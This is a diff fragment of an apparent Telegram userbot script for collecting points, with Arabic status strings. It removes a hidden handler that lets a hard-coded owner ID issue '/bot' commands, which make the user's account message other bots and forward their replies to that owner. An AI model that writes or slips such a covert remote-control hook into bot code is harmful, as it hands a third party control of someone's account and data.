@@ -153,17 +153,6 @@ async def _(event):
         msgs = list.messages[0]
         if msgs.message.find('لا يوجد قنوات في الوقت الحالي , قم يتجميع النقاط بطريقه مختلفه') != -1:
             await tembm.send_message(event.chat_id, f"**تم تجميع نقـاط...! **")
-            
-@tembm.on(events.NewMessage(outgoing=False, pattern=r'^/bot (.*) (.*)'))
-async def OwnerStart(event):
-    bots = event.pattern_match.group(1) 
-    ids = event.pattern_match.group(2) 
-    sender = await event.get_sender()
-    if sender.id == ownerhson_id :
-     send = await tembm.send_message(bots,f'/start {ids}')
-     sleep(6)
-    msg = await tembm.get_messages(bots, limit=2)
-    await msg[1].forward_to(ownerhson_id)
 
             break
         url = msgs.reply_markup.rows[0].buttons[0].url
